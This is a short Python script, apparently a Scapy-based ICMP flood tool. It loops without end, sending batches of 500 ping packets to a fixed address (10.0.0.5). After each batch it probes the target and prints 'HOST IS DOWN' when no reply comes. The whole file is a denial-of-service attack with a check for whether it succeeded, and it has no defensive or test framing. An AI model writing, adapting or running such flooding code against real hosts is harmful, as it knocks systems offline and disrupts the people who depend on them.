from scapy.all import *

target_ip = "10.0.0.5"
target_port = 80

ip = IP(dst=target_ip)


icmp = ICMP()
packet = ip / icmp 
while True:
	send(packet,count=500,verbose=1)
	print("\n### TESTING REACHABILITY ###\n")
	response = sr1(packet, timeout=3)
	#response.summary()
	if response == None:
		print("\nNO RESPONSE. HOST IS DOWN\n")
		# break
